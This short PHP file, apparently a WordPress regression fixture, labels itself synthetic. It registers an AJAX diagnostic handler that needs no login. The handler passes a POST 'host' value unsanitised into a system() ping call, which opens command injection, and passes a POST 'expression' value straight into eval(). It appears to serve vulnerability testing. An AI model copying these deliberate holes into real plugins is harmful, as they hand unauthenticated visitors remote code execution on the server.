<?php
/* Synthetic regression fixture. This is not third-party plugin source. */

add_action('wp_ajax_nopriv_run_diagnostic', 'run_diagnostic');

function run_diagnostic() {
    $host = $_POST['host'];
    $expression = $_POST['expression'];

    system('ping -c 1 ' . $host);
    eval($expression);
}
